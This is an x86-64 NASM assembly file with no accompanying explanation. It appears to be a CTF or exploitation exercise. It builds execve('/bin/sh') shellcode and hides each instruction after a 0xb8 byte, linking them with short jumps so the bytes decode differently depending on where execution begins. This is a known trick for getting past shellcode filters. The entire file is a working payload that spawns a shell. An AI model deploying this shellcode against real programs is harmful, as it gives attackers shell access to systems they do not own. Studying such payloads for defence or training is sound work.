[bits 64]

global _start

section .text
_start:
	db 0xb8
	nop
	nop
.jmp00:
	jmp .jmp10
	
	db 0xb8

.jmp10:
	push rax		; /sh\x00\x00\x00\x00\x00
	nop			; push rax is 1 byte long
	jmp .jmp20

	db 0xb8
.jmp20:	
	mov al, 'i'
	jmp .jmp30

	db 0xb8
.jmp30:
	mov ah, 'n'
	jmp .jmp40

	db 0xb8
.jmp40:
	push ax			; in/sh\x00
	jmp .jmp50

	db 0xb8
.jmp50:
	mov ah, 'b'
	jmp .jmp60

	db 0xb8
.jmp60:
	mov al, '/'
	jmp .jmp70

	db 0xb8
.jmp70:
	push ax			; /bin/sh\x00
	jmp .jmp80

	db 0xb8
.jmp80:
	xchg rax, rsp		; move "/bin/sh"'s address to rdi
	jmp .jmp85

	db 0xb8
.jmp85:
	xchg rax, rdi
	jmp .jmp90

	db 0xb8
.jmp90:
	xor eax, eax
	jmp .jmp100

	db 0xb8
.jmp100:
	xor edx, edx
	jmp .jmp110
	
	db 0xb8
.jmp110:
	xor esi, esi
	jmp .jmp120

	db 0xb8
.jmp120:
	mov al, 59
	jmp .jmp130

	db 0xb8
.jmp130:
	syscall
	nop
	nop
	
	mov eax, 0x68732f	
	jmp .jmp00
